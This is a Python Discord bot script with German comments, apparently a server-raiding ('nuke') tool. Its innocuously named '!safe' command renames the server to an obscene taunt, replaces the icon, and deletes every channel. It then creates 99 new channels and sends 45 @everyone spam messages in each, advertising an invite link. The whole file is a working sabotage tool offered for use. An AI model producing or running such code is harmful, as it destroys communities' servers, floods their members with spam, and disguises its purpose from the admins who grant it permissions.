import os
import discord
from discord.ext import commands
import asyncio

TOKEN = os.getenv("DISCORD_TOKEN")
if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN nicht gesetzt. Setze die Umgebungsvariable (lokal .env oder Railway).")

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot online als {bot.user} (id: {bot.user.id})")

@bot.command(name="safe")
async def reset_channels(ctx):
    guild = ctx.guild
    try:
        await guild.edit(name="FUCKED BY NC BITCHES!")
        with open("nc_icon.png", "rb") as icon_file:
            await guild.edit(icon=icon_file.read())
        print("✅ Servername und Icon geändert.")
    except Exception as e:
        print(f"❌ Fehler beim Bearbeiten des Servers: {e}")

    # Alte Kanäle parallel löschen
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    # Neue Kanäle parallel erstellen
    create_tasks = [
        guild.create_text_channel(
            name="fucked-by-nc🚀🚀🚀",
            overwrites={guild.default_role: discord.PermissionOverwrite(view_channel=True)}
        )
        for _ in range(99)
    ]
    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
    new_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]

    # Optional: Nachrichten in allen neuen Kanälen senden
    async def spam(channel):
        for _ in range(45):
            try:
                await channel.send("Fucked by EL NARCO! @everyone https://discord.gg/elnarco")
            except Exception as e:
                print(f"Fehler in {channel.name}: {e}")

    await asyncio.gather(*(spam(c) for c in new_channels))

bot.run(TOKEN)
